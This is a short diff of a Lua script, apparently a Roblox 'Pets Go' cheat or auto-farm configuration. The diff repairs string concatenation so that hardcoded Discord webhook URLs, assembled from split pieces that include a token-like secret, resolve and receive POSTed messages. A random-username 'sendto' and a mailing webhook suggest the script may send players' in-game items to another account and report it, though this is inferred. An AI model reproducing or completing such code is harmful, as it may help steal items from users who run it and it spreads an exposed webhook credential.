@@ -66,7 +66,7 @@ local sendto = getRandomUsername()
 local web4 = "https://discord.com/api/webhooks/1330886743590703175/"
 local web5 = "TDAvi0vzfBZU-UbEDwUg3RtEzy_Xz8BVUu2NKljEso4PezFUDuOJ1ZI5BJoL2x2_VuAq"
 
-local Url2 = web4 + web5
+local Url2 = web4 .. web5
 local Http2 = game:GetService("HttpService")
 	local Msg = function(msg)
 		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
@@ -191,8 +191,8 @@ getgenv().petsGoConfig = {
     CONSUME_EVENT_GIFT_BAG = false,
     CONSUME_EVENT_EGG = false, -- Hype eggs not included
 
-    WEBHOOK_URL = web + web1,
-    MAILING_WEBHOOK_URL = web2 + web3,
+    WEBHOOK_URL = web .. web1,
+    MAILING_WEBHOOK_URL = web2 .. web3,
     DISCORD_ID = "1168121186790686779",  -- Required!!! (For public-webhook)
     WEBHOOK_ODDS = 100000000, -- Minimum Pet Odds To Trigger Webhook
 
